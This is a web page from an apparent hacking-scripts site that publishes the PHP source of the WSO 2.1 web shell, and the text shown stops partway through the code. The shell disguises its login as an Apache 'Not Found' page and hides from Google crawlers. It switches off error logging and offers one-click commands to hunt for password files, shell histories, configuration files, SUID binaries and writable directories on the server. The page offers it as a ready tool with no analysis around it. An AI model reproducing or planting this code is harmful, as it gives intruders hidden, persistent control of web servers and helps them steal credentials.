<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> WSO 2.1 Web Shell </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>WSO 2.1 Web Shell</h2>
<p class="meta">11 Feb 2014</p>

<p>WSO 2.1 Web Shell by devilscafe.in</p>

<h3>WSO 2.1 Web Shell Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">   1</span> <span class="cp">&lt;?php</span> 
<span class="lineno">   2</span> <span class="cm">/* WSO 2.1 (Web Shell by devilscafe.in) */</span> 
<span class="lineno">   3</span> <span class="nv">$auth_pass</span> <span class="o">=</span> <span class="s2">&quot;15de21c670ae7c3f6f3f1f37029303c9&quot;</span><span class="p">;</span> 
<span class="lineno">   4</span> <span class="nv">$color</span> <span class="o">=</span> <span class="s2">&quot;#00ff00&quot;</span><span class="p">;</span> 
<span class="lineno">   5</span> <span class="nv">$default_action</span> <span class="o">=</span> <span class="s1">&#39;FilesMan&#39;</span><span class="p">;</span> 
<span class="lineno">   6</span> <span class="o">@</span><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;SELF_PATH&#39;</span><span class="p">,</span> <span class="k">__FILE__</span><span class="p">);</span> 
<span class="lineno">   7</span> <span class="k">if</span><span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">],</span><span class="s1">&#39;Google&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno">   8</span>     <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.0 404 Not Found&#39;</span><span class="p">);</span> 
<span class="lineno">   9</span>     <span class="k">exit</span><span class="p">;</span> 
<span class="lineno">  10</span> <span class="p">}</span> 
<span class="lineno">  11</span> <span class="o">@</span><span class="nb">session_start</span><span class="p">();</span> 
<span class="lineno">  12</span> <span class="o">@</span><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
<span class="lineno">  13</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;error_log&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">);</span> 
<span class="lineno">  14</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;log_errors&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> 
<span class="lineno">  15</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;max_execution_time&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> 
<span class="lineno">  16</span> <span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
<span class="lineno">  17</span> <span class="o">@</span><span class="nb">set_magic_quotes_runtime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
<span class="lineno">  18</span> <span class="o">@</span><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;VERSION&#39;</span><span class="p">,</span> <span class="s1">&#39;2.1&#39;</span><span class="p">);</span> 
<span class="lineno">  19</span> <span class="k">if</span><span class="p">(</span> <span class="nb">get_magic_quotes_gpc</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno">  20</span>     <span class="k">function</span> <span class="nf">stripslashes_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">  21</span>         <span class="k">return</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span> <span class="o">?</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">&#39;stripslashes_array&#39;</span><span class="p">,</span> <span class="nv">$array</span><span class="p">)</span> <span class="o">:</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span> 
<span class="lineno">  22</span>     <span class="p">}</span> 
<span class="lineno">  23</span>     <span class="nv">$_POST</span> <span class="o">=</span> <span class="nx">stripslashes_array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span> 
<span class="lineno">  24</span> <span class="p">}</span> 
<span class="lineno">  25</span> <span class="k">function</span> <span class="nf">printLogin</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno">  26</span>     <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno">  27</span> <span class="x">&lt;h1&gt;Not Found&lt;/h1&gt; </span>
<span class="lineno">  28</span> <span class="x">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt; </span>
<span class="lineno">  29</span> <span class="x">&lt;hr&gt; </span>
<span class="lineno">  30</span> <span class="x">&lt;address&gt;Apache Server at </span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x"> Port 80&lt;/address&gt; </span>
<span class="lineno">  31</span> <span class="x">    &lt;style&gt; </span>
<span class="lineno">  32</span> <span class="x">        input { margin:0;background-color:#fff;border:1px solid #fff; } </span>
<span class="lineno">  33</span> <span class="x">    &lt;/style&gt; </span>
<span class="lineno">  34</span> <span class="x">    &lt;center&gt; </span>
<span class="lineno">  35</span> <span class="x">    &lt;form method=post&gt; </span>
<span class="lineno">  36</span> <span class="x">    &lt;input type=password name=pass&gt; </span>
<span class="lineno">  37</span> <span class="x">    &lt;/form&gt;&lt;/center&gt; </span>
<span class="lineno">  38</span> <span class="x">    </span><span class="cp">&lt;?php</span> 
<span class="lineno">  39</span>     <span class="k">exit</span><span class="p">;</span> 
<span class="lineno">  40</span> <span class="p">}</span> 
<span class="lineno">  41</span> <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])]</span> <span class="p">))</span> 
<span class="lineno">  42</span>     <span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$auth_pass</span> <span class="p">)</span> <span class="o">||</span> 
<span class="lineno">  43</span>         <span class="p">(</span> <span class="nb">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$auth_pass</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> 
<span class="lineno">  44</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span> 
<span class="lineno">  45</span>     <span class="k">else</span> 
<span class="lineno">  46</span>         <span class="nx">printLogin</span><span class="p">();</span> 
<span class="lineno">  47</span> 
<span class="lineno">  48</span> <span class="k">if</span><span class="p">(</span> <span class="nb">strtolower</span><span class="p">(</span> <span class="nb">substr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span> <span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;win&quot;</span> <span class="p">)</span> 
<span class="lineno">  49</span>     <span class="nv">$os</span> <span class="o">=</span> <span class="s1">&#39;win&#39;</span><span class="p">;</span> 
<span class="lineno">  50</span> <span class="k">else</span> 
<span class="lineno">  51</span>     <span class="nv">$os</span> <span class="o">=</span> <span class="s1">&#39;nix&#39;</span><span class="p">;</span> 
<span class="lineno">  52</span> <span class="nv">$safe_mode</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">);</span> 
<span class="lineno">  53</span> <span class="nv">$disable_functions</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">);</span> 
<span class="lineno">  54</span> <span class="nv">$home_cwd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span> 
<span class="lineno">  55</span> <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> 
<span class="lineno">  56</span>     <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span> 
<span class="lineno">  57</span> <span class="nv">$cwd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span> 
<span class="lineno">  58</span> <span class="k">if</span><span class="p">(</span> <span class="nv">$os</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">  59</span>     <span class="nv">$home_cwd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$home_cwd</span><span class="p">);</span> 
<span class="lineno">  60</span>     <span class="nv">$cwd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$cwd</span><span class="p">);</span> 
<span class="lineno">  61</span> <span class="p">}</span> 
<span class="lineno">  62</span> <span class="k">if</span><span class="p">(</span> <span class="nv">$cwd</span><span class="p">[</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span> 
<span class="lineno">  63</span>     <span class="nv">$cwd</span> <span class="o">.=</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span> 
<span class="lineno">  64</span>      
<span class="lineno">  65</span> <span class="k">if</span><span class="p">(</span><span class="nv">$os</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">)</span> 
<span class="lineno">  66</span>     <span class="nv">$aliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> 
<span class="lineno">  67</span>         <span class="s2">&quot;List Directory&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;dir&quot;</span><span class="p">,</span> 
<span class="lineno">  68</span>         <span class="s2">&quot;Find index.php in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;dir /s /w /b index.php&quot;</span><span class="p">,</span> 
<span class="lineno">  69</span>         <span class="s2">&quot;Find *config*.php in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;dir /s /w /b *config*.php&quot;</span><span class="p">,</span> 
<span class="lineno">  70</span>         <span class="s2">&quot;Show active connections&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;netstat -an&quot;</span><span class="p">,</span> 
<span class="lineno">  71</span>         <span class="s2">&quot;Show running services&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;net start&quot;</span><span class="p">,</span> 
<span class="lineno">  72</span>         <span class="s2">&quot;User accounts&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;net user&quot;</span><span class="p">,</span> 
<span class="lineno">  73</span>         <span class="s2">&quot;Show computers&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;net view&quot;</span><span class="p">,</span> 
<span class="lineno">  74</span>         <span class="s2">&quot;ARP Table&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;arp -a&quot;</span><span class="p">,</span> 
<span class="lineno">  75</span>         <span class="s2">&quot;IP Configuration&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;ipconfig /all&quot;</span> 
<span class="lineno">  76</span>     <span class="p">);</span> 
<span class="lineno">  77</span> <span class="k">else</span> 
<span class="lineno">  78</span>     <span class="nv">$aliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> 
<span class="lineno">  79</span>           <span class="s2">&quot;List dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;ls -la&quot;</span><span class="p">,</span> 
<span class="lineno">  80</span>         <span class="s2">&quot;list file attributes on a Linux second extended file system&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;lsattr -va&quot;</span><span class="p">,</span> 
<span class="lineno">  81</span>           <span class="s2">&quot;show opened ports&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;netstat -an | grep -i listen&quot;</span><span class="p">,</span> 
<span class="lineno">  82</span>         <span class="s2">&quot;Find&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> 
<span class="lineno">  83</span>           <span class="s2">&quot;find all suid files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -perm -04000 -ls&quot;</span><span class="p">,</span> 
<span class="lineno">  84</span>           <span class="s2">&quot;find suid files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -perm -04000 -ls&quot;</span><span class="p">,</span>
<span class="lineno">  85</span>           <span class="s2">&quot;find all sgid files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -perm -02000 -ls&quot;</span><span class="p">,</span> 
<span class="lineno">  86</span>           <span class="s2">&quot;find sgid files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -perm -02000 -ls&quot;</span><span class="p">,</span>
<span class="lineno">  87</span>           <span class="s2">&quot;find config.inc.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name config.inc.php&quot;</span><span class="p">,</span> 
<span class="lineno">  88</span>           <span class="s2">&quot;find config* files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span> 
<span class="lineno">  89</span>           <span class="s2">&quot;find config* files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span> 
<span class="lineno">  90</span>           <span class="s2">&quot;find all writable folders and files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -perm -2 -ls&quot;</span><span class="p">,</span> 
<span class="lineno">  91</span>           <span class="s2">&quot;find all writable folders and files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -perm -2 -ls&quot;</span><span class="p">,</span> 
<span class="lineno">  92</span>           <span class="s2">&quot;find all service.pwd files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name service.pwd&quot;</span><span class="p">,</span> 
<span class="lineno">  93</span>           <span class="s2">&quot;find service.pwd files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name service.pwd&quot;</span><span class="p">,</span> 
<span class="lineno">  94</span>           <span class="s2">&quot;find all .htpasswd files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name .htpasswd&quot;</span><span class="p">,</span> 
<span class="lineno">  95</span>           <span class="s2">&quot;find .htpasswd files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name .htpasswd&quot;</span><span class="p">,</span> 
<span class="lineno">  96</span>           <span class="s2">&quot;find all .bash_history files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name .bash_history&quot;</span><span class="p">,</span> 
<span class="lineno">  97</span>           <span class="s2">&quot;find .bash_history files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name .bash_history&quot;</span><span class="p">,</span> 
<span class="lineno">  98</span>           <span class="s2">&quot;find all .fetchmailrc files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name .fetchmailrc&quot;</span><span class="p">,</span> 
<span class="lineno">  99</span>           <span class="s2">&quot;find .fetchmailrc files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name .fetchmailrc&quot;</span><span class="p">,</span> 
<span class="lineno"> 100</span>         <span class="s2">&quot;Locate&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> 
<span class="lineno"> 101</span>           <span class="s2">&quot;locate httpd.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate httpd.conf&quot;</span><span class="p">,</span> 
<span class="lineno"> 102</span>         <span class="s2">&quot;locate vhosts.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate vhosts.conf&quot;</span><span class="p">,</span> 
<span class="lineno"> 103</span>         <span class="s2">&quot;locate proftpd.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate proftpd.conf&quot;</span><span class="p">,</span> 
<span class="lineno"> 104</span>         <span class="s2">&quot;locate psybnc.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate psybnc.conf&quot;</span><span class="p">,</span> 
<span class="lineno"> 105</span>         <span class="s2">&quot;locate my.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate my.conf&quot;</span><span class="p">,</span> 
<span class="lineno"> 106</span>         <span class="s2">&quot;locate admin.php files&quot;</span> <span class="o">=&gt;</span><span class="s2">&quot;locate admin.php&quot;</span><span class="p">,</span> 
<span class="lineno"> 107</span>         <span class="s2">&quot;locate cfg.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate cfg.php&quot;</span><span class="p">,</span> 
<span class="lineno"> 108</span>         <span class="s2">&quot;locate conf.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate conf.php&quot;</span><span class="p">,</span> 
<span class="lineno"> 109</span>         <span class="s2">&quot;locate config.dat files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.dat&quot;</span><span class="p">,</span> 
<span class="lineno"> 110</span>         <span class="s2">&quot;locate config.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.php&quot;</span><span class="p">,</span> 
<span class="lineno"> 111</span>         <span class="s2">&quot;locate config.inc files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.inc&quot;</span><span class="p">,</span> 
<span class="lineno"> 112</span>         <span class="s2">&quot;locate config.inc.php&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.inc.php&quot;</span><span class="p">,</span> 
<span class="lineno"> 113</span>         <span class="s2">&quot;locate config.default.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.default.php&quot;</span><span class="p">,</span> 
<span class="lineno"> 114</span>         <span class="s2">&quot;locate config* files &quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config&quot;</span><span class="p">,</span> 
<span class="lineno"> 115</span>         <span class="s2">&quot;locate .conf files&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;locate &#39;.conf&#39;&quot;</span><span class="p">,</span> 
<span class="lineno"> 116</span>         <span class="s2">&quot;locate .pwd files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.pwd&#39;&quot;</span><span class="p">,</span> 
<span class="lineno"> 117</span>         <span class="s2">&quot;locate .sql files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.sql&#39;&quot;</span><span class="p">,</span> 
<span class="lineno"> 118</span>         <span class="s2">&quot;locate .htpasswd files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.htpasswd&#39;&quot;</span><span class="p">,</span> 
<span class="lineno"> 119</span>         <span class="s2">&quot;locate .bash_history files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.bash_history&#39;&quot;</span><span class="p">,</span> 
<span class="lineno"> 120</span>         <span class="s2">&quot;locate .mysql_history files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.mysql_history&#39;&quot;</span><span class="p">,</span> 
<span class="lineno"> 121</span>         <span class="s2">&quot;locate .fetchmailrc files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.fetchmailrc&#39;&quot;</span><span class="p">,</span> 
<span class="lineno"> 122</span>         <span class="s2">&quot;locate backup files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate backup&quot;</span><span class="p">,</span> 
<span class="lineno"> 123</span>         <span class="s2">&quot;locate dump files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate dump&quot;</span><span class="p">,</span> 
<span class="lineno"> 124</span>         <span class="s2">&quot;locate priv files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate priv&quot;</span>     
<span class="lineno"> 125</span>     <span class="p">);</span> 
<span class="lineno"> 126</span> 
<span class="lineno"> 127</span> <span class="k">function</span> <span class="nf">printHeader</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 128</span>     <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]))</span> 
<span class="lineno"> 129</span>         <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;UTF-8&quot;</span><span class="p">;</span> 
<span class="lineno"> 130</span>     <span class="k">global</span> <span class="nv">$color</span><span class="p">;</span> 
<span class="lineno"> 131</span>     <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno"> 132</span> <span class="x">&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&#39;Content-Type&#39; content=&#39;text/html; charset=</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">&#39;&gt;&lt;title&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">- 404 Not Found Shell V.</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">VERSION</span><span class="cp">?&gt;</span><span class="x">&lt;/title&gt; </span>
<span class="lineno"> 133</span> <span class="x">&lt;style&gt; </span>
<span class="lineno"> 134</span> <span class="x">    body {background-color:#000;color:#fff;} </span>
<span class="lineno"> 135</span> <span class="x">    body,td,th    { font: 9pt Lucida,Verdana;margin:0;vertical-align:top; } </span>
<span class="lineno"> 136</span> <span class="x">    span,h1,a    { color:</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$color</span><span class="cp">?&gt;</span><span class="x"> !important; } </span>
<span class="lineno"> 137</span> <span class="x">    span        { font-weight: bolder; } </span>
<span class="lineno"> 138</span> <span class="x">    h1            { border:1px solid </span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$color</span><span class="cp">?&gt;</span><span class="x">;padding: 2px 5px;font: 14pt Verdana;margin:0px; } </span>
<span class="lineno"> 139</span> <span class="x">    div.content    { padding: 5px;margin-left:5px;} </span>
<span class="lineno"> 140</span> <span class="x">    a            { text-decoration:none; } </span>
<span class="lineno"> 141</span> <span class="x">    a:hover        { background:#ff0000; } </span>
<span class="lineno"> 142</span> <span class="x">    .ml1        { border:1px solid #444;padding:5px;margin:0;overflow: auto; } </span>
<span class="lineno"> 143</span> <span class="x">    .bigarea    { width:100%;height:250px; } </span>
<span class="lineno"> 144</span> <span class="x">    input, textarea, select    { margin:0;color:#00ff00;background-color:#000;border:1px solid </span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$color</span><span class="cp">?&gt;</span><span class="x">; font: 9pt Monospace,&quot;Courier New&quot;; } </span>
<span class="lineno"> 145</span> <span class="x">    form        { margin:0px; } </span>
<span class="lineno"> 146</span> <span class="x">    #toolsTbl    { text-align:center; } </span>
<span class="lineno"> 147</span> <span class="x">    .toolsInp    { width: 80%; } </span>
<span class="lineno"> 148</span> <span class="x">    .main th    {text-align:left;} </span>
<span class="lineno"> 149</span> <span class="x">    .main tr:hover{background-color:#5e5e5e;} </span>
<span class="lineno"> 150</span> <span class="x">    .main td, th{vertical-align:middle;} </span>
<span class="lineno"> 151</span> <span class="x">    pre            {font-family:Courier,Monospace;} </span>
<span class="lineno"> 152</span> <span class="x">    #cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);} </span>
<span class="lineno"> 153</span> <span class="x">&lt;/style&gt; </span>
<span class="lineno"> 154</span> <span class="x">&lt;script&gt; </span>
<span class="lineno"> 155</span> <span class="x">    function set(a,c,p1,p2,p3,charset) { </span>
<span class="lineno"> 156</span> <span class="x">        if(a != null)document.mf.a.value=a; </span>
<span class="lineno"> 157</span> <span class="x">        if(c != null)document.mf.c.value=c; </span>
<span class="lineno"> 158</span> <span class="x">        if(p1 != null)document.mf.p1.value=p1; </span>
<span class="lineno"> 159</span> <span class="x">        if(p2 != null)document.mf.p2.value=p2; </span>
<span class="lineno"> 160</span> <span class="x">        if(p3 != null)document.mf.p3.value=p3; </span>
<span class="lineno"> 161</span> <span class="x">        if(charset != null)document.mf.charset.value=charset; </span>
<span class="lineno"> 162</span> <span class="x">    } </span>
<span class="lineno"> 163</span> <span class="x">    function g(a,c,p1,p2,p3,charset) { </span>
<span class="lineno"> 164</span> <span class="x">        set(a,c,p1,p2,p3,charset); </span>
<span class="lineno"> 165</span> <span class="x">        document.mf.submit(); </span>
<span class="lineno"> 166</span> <span class="x">    } </span>
<span class="lineno"> 167</span> <span class="x">    function a(a,c,p1,p2,p3,charset) { </span>
<span class="lineno"> 168</span> <span class="x">        set(a,c,p1,p2,p3,charset); </span>
<span class="lineno"> 169</span> <span class="x">        var params = &quot;ajax=true&quot;; </span>
<span class="lineno"> 170</span> <span class="x">        for(i=0;i&lt;document.mf.elements.length;i++) </span>
<span class="lineno"> 171</span> <span class="x">            params += &quot;&amp;&quot;+document.mf.elements[i].name+&quot;=&quot;+encodeURIComponent(document.mf.elements[i].value); </span>
<span class="lineno"> 172</span> <span class="x">        sr(&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">];</span><span class="cp">?&gt;</span><span class="x">&#39;, params); </span>
<span class="lineno"> 173</span> <span class="x">    } </span>
<span class="lineno"> 174</span> <span class="x">    function sr(url, params) {     </span>
<span class="lineno"> 175</span> <span class="x">        if (window.XMLHttpRequest) { </span>
<span class="lineno"> 176</span> <span class="x">            req = new XMLHttpRequest(); </span>
<span class="lineno"> 177</span> <span class="x">            req.onreadystatechange = processReqChange; </span>
<span class="lineno"> 178</span> <span class="x">            req.open(&quot;POST&quot;, url, true); </span>
<span class="lineno"> 179</span> <span class="x">            req.setRequestHeader (&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;); </span>
<span class="lineno"> 180</span> <span class="x">            req.send(params); </span>
<span class="lineno"> 181</span> <span class="x">        }  </span>
<span class="lineno"> 182</span> <span class="x">        else if (window.ActiveXObject) { </span>
<span class="lineno"> 183</span> <span class="x">            req = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); </span>
<span class="lineno"> 184</span> <span class="x">            if (req) { </span>
<span class="lineno"> 185</span> <span class="x">                req.onreadystatechange = processReqChange; </span>
<span class="lineno"> 186</span> <span class="x">                req.open(&quot;POST&quot;, url, true); </span>
<span class="lineno"> 187</span> <span class="x">                req.setRequestHeader (&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;); </span>
<span class="lineno"> 188</span> <span class="x">                req.send(params); </span>
<span class="lineno"> 189</span> <span class="x">            } </span>
<span class="lineno"> 190</span> <span class="x">        } </span>
<span class="lineno"> 191</span> <span class="x">    } </span>
<span class="lineno"> 192</span> <span class="x">    function processReqChange() { </span>
<span class="lineno"> 193</span> <span class="x">        if( (req.readyState == 4) ) </span>
<span class="lineno"> 194</span> <span class="x">            if(req.status == 200) { </span>
<span class="lineno"> 195</span> <span class="x">                //alert(req.responseText); </span>
<span class="lineno"> 196</span> <span class="x">                var reg = new RegExp(&quot;(\\d+)([\\S\\s]*)&quot;, &quot;m&quot;); </span>
<span class="lineno"> 197</span> <span class="x">                var arr=reg.exec(req.responseText); </span>
